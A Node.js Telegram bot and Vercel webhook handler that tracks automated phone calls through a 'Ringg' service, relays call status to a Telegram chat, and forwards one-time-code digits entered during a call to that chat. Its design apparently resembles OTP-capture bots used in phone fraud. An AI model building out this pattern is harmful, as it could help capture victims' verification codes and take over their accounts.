require("dotenv").config();

const TelegramBot = require("node-telegram-bot-api");
const mongoose = require("mongoose");

// ============ MongoDB Cache ============

let cached = global.mongoose;

if (!cached) {
  cached = global.mongoose = { conn: null, promise: null };
}

async function connectDB() {
  if (cached.conn) return cached.conn;

  if (!cached.promise) {
    cached.promise = mongoose.connect(process.env.MONGO_URI, {
      bufferCommands: false,
    });
  }

  cached.conn = await cached.promise;
  console.log("✅ MongoDB connected");

  return cached.conn;
}

// ============ Telegram Bot (Webhook Mode) ============

const bot = new TelegramBot(process.env.BOT_TOKEN, {
  webHook: true,
});

// ============ Bot Commands ============

bot.on("message", async (msg) => {
  const chatId = msg.chat.id;
  const text = msg.text || "";

  console.log("📩 Message:", text);

  if (text === "/start") {
    await bot.sendMessage(chatId, "✅ Bot is online!");
    return;
  }

  if (text === "/help") {
    await bot.sendMessage(
      chatId,
      "📌 Commands:\n/start - Start\n/help - Help"
    );
    return;
  }

  await bot.sendMessage(chatId, "🤖 You said: " + text);
});

// ============ User Model ============

const User =
  mongoose.models.User ||
  mongoose.model("User", {
    chatId: String,
    titleName: String,
    category: String,
    phone: String,
    status: String,
    otp: String,
  });

// ============ Vercel Handler ============

module.exports = async function handler(req, res) {
  try {
    await connectDB();

    const body = req.body;

    // Telegram Webhook
    if (body && body.message) {
      await bot.processUpdate(body);
      return res.status(200).send("OK");
    }

    // Ringg Webhook
    if (body && body.phone) {
      const { phone, step, intent, digits, status } = body;

      const user = await User.findOne({ phone });
      if (!user) return res.send("OK");

      if (status === "ringing") {
        await bot.sendMessage(user.chatId, "📞 Ringing...");
      }

      if (status === "picked") {
        await bot.sendMessage(user.chatId, "☎️ Call answered");
      }

      if (status === "ended") {
        await bot.sendMessage(user.chatId, "📴 Call ended");
      }

      if (step === "confirm_request" && intent === "no") {
        const otp = Math.floor(
          100000 + Math.random() * 900000
        ).toString();

        user.otp = otp;
        user.status = "otp";
        await user.save();

        await bot.sendMessage(
          user.chatId,
          `🔐 OTP: ${otp}\nEnter it in Telegram`
        );
      }

      if (step === "otp_step" && digits) {
        await bot.sendMessage(
          user.chatId,
          `📲 OTP entered: ${digits}`
        );
      }

      return res.send("OK");
    }

    return res.send("OK");
  } catch (err) {
    console.error("❌ Webhook Error:", err);
    return res.status(500).send("Error");
  }
};
